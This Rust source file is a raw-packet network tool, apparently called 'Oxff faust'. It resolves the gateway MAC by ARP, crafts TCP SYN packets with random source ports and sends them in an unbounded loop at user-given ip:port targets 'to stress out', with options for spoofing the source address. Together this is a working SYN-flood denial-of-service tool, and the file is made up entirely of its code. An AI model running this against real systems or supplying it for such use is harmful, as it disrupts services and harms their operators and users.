extern crate pnet;
extern crate rand;

use clap::Parser;

use default_net::gateway::Gateway;
use default_net::interface::{get_default_interface, get_interfaces};
use default_net::ip::Ipv4Net;

use pnet::ipnetwork::IpNetwork;

use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender};
use pnet::datalink::{MacAddr, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{self, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{self, MutableTcpPacket, TcpFlags, TcpOption};
use pnet::packet::MutablePacket;

use std::error::Error;
use std::net::{IpAddr, Ipv4Addr};
use std::str::FromStr;
use std::thread;

const ETHERNET_HEADER_LEN: usize = 14;
const IPV4_HEADER_LEN: usize = 20;

pub struct Config<'a> {
    pub destination: &'a Target,
    pub destination_mac: &'a MacAddr,
    pub ipv4: &'a Vec<Ipv4Net>,
    pub iface_ip: Ipv4Addr,
    pub iface_name: &'a String,
    pub iface_src_mac: &'a MacAddr,
}

#[derive(Debug, PartialEq)]
pub struct Target {
    addr: Ipv4Addr,
    port: u16,
}

// XXX: it's actually MacAddr or error (i assume, should be just a Result)
fn arp_get_mac(
    sender: &mut Box<dyn DataLinkSender>,
    receiver: &mut Box<dyn DataLinkReceiver>,
    interface: &NetworkInterface,
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> MacAddr {
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(interface.mac.unwrap());
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);

    // XXX: can I just make this by taking subslice?
    ethernet_packet.set_payload(arp_packet.packet_mut());

    sender
        .send_to(ethernet_packet.packet_mut(), None)
        .unwrap()
        .unwrap();

    // XXX: loop thourgh packets with timeout
    loop {
        match receiver.next() {
            Ok(buf) => {
                if let Some(arp) =
                    ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..])
                {
                    if arp.get_operation() == ArpOperations::Reply
                        && arp.get_sender_proto_addr() == target_ip
                    {
                        return arp.get_sender_hw_addr();
                    }
                }
            }
            Err(e) => panic!("Error happened {}", e),
        }
    }
}

pub fn build_packet(config: &Config, tmp_packet: &mut [u8]) {
    // XXX: keep configuration for IP spoofing
    let iface_ip = config.iface_ip;

    // setup Ethernet header
    {
        let mut eth_header =
            MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(*config.destination_mac);
        eth_header.set_source(*config.iface_src_mac);
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    // setup IP header
    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(52);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(iface_ip);
        ip_header.set_destination(config.destination.addr);
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(64);
        ip_header.set_version(4);
        ip_header.set_flags(Ipv4Flags::DontFragment);

        let checksum = ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    // setup TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
                .unwrap();

        // XXX: this should be in the range 32000-61000, or read sysctl settings
        //      to be even more precise than this
        tcp_header.set_source(rand::random::<u16>());
        tcp_header.set_destination(config.destination.port);
        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(65535);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(0);
        tcp_header.set_options(&[
            TcpOption::mss(1460),
            TcpOption::sack_perm(),
            TcpOption::nop(),
            TcpOption::nop(),
            TcpOption::wscale(6),
        ]);

        let checksum = tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &iface_ip,
            &config.destination.addr,
        );
        tcp_header.set_checksum(checksum);
    }
}

pub fn repurpose_packet(config: &Config, tmp_packet: &mut [u8]) {
    // XXX: i'm not sure if need to update identification bit from IP header

    // update TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
                .unwrap();

        tcp_header.set_source(rand::random::<u16>());
        let checksum = tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &config.iface_ip,
            &config.destination.addr,
        );
        tcp_header.set_checksum(checksum);
    }
}

fn sender(iface_name: String, destination: &Target) {
    let dinterfaces = get_interfaces();
    let dinterface = dinterfaces
        .iter()
        .find(|iface| iface.name == iface_name)
        .unwrap();

    // found iface to work with
    print!("Interface: {:?}\n", dinterface);

    // XXX: no need to search the same thing twice
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .iter()
        .find(|iface| iface.name == iface_name)
        .unwrap();

    // XXX: take this from dinterface instead
    // take IPv4 addr
    let iface_ip = interface
        .ips
        .iter()
        .filter_map(|network| match network.ip() {
            IpAddr::V4(ipv4) => Some(ipv4),
            _ => None,
        })
        .next()
        .expect(&format!(
            "the interface {} does not have any IP addresses",
            interface
        ));

    let inet = interface
        .ips
        .iter()
        .filter_map(|network| match network {
            IpNetwork::V4(inet) => Some(inet),
            _ => None,
        })
        .next()
        .unwrap();

    println!("All IPs: {:?}", inet.size());
    println!("Source IP: {}", iface_ip);

    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };

    // XXX: only replace target IP with gateway if it's not broadcast
    let gateway_ip = match dinterface.gateway {
        Some(Gateway { ip_addr, .. }) => {
            if let IpAddr::V4(ip_addr) = ip_addr {
                ip_addr
            } else {
                todo!()
            }
        }
        _ => destination.addr,
    };

    println!("Gateway IP: {}", gateway_ip);

    let destination_mac = arp_get_mac(&mut tx, &mut rx, interface, iface_ip, gateway_ip);

    print!("Remote addr MAC: {:?}\n", destination_mac);

    let config = Config {
        destination,
        destination_mac: &destination_mac,
        ipv4: &dinterface.ipv4,
        iface_ip,
        iface_name: &interface.name,
        iface_src_mac: &interface.mac.unwrap(),
    };

    let mut buffer = [0u8; 66];
    // building initial packet
    build_packet(&config, &mut buffer);
    // XXX: do everything before this line in main thread (including ARP resolve)
    loop {
        // replace port field in the packet
        repurpose_packet(&config, &mut buffer);
        tx.send_to(&buffer, None);
    }
}

impl FromStr for Target {
    type Err = Box<dyn Error + Send + Sync + 'static>;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let pos = s
            .find(':')
            .ok_or_else(|| format!("invalid target {}: use ip:port syntax", s))?;
        Ok(Self {
            addr: s[..pos].parse()?,
            port: s[pos + 1..].parse()?,
        })
    }
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// ip:port pair to stress out
    target: Vec<Target>,

    /// Source port(s) for packets
    #[clap(short = 's', long, parse(try_from_str))]
    source_port: Option<u16>,

    /// Source address(es) for packets
    #[clap(short = 'S', long)]
    source_ip: Option<IpAddr>,

    /// Specify gateway MAC address
    #[clap(short = 'G', long)]
    gateway_mac: Option<MacAddr>,

    /// Specify network interface to use
    #[clap(short = 'i', long)]
    interface: Option<String>,
}

fn main() {
    let args = Args::parse();

    println!(
        r"
   ____       ________   ____                 __ 
  / __ \_  __/ __/ __/  / __/___ ___  _______/ /_
 / / / / |/_/ /_/ /_   / /_/ __ `/ / / / ___/ __/
/ /_/ />  </ __/ __/  / __/ /_/ / /_/ (__  ) /_  
\____/_/|_/_/ /_/    /_/  \__,_/\__,_/____/\__/  
    "
    );

    let iface = get_default_interface().unwrap();
    let mut handles = Vec::new();
    for target in args.target.into_iter() {
        let iface_name = iface.name.clone();
        handles.push(thread::spawn(move || sender(iface_name, &target)));
    }
    for handle in handles.into_iter() {
        handle.join().unwrap();
    }
}
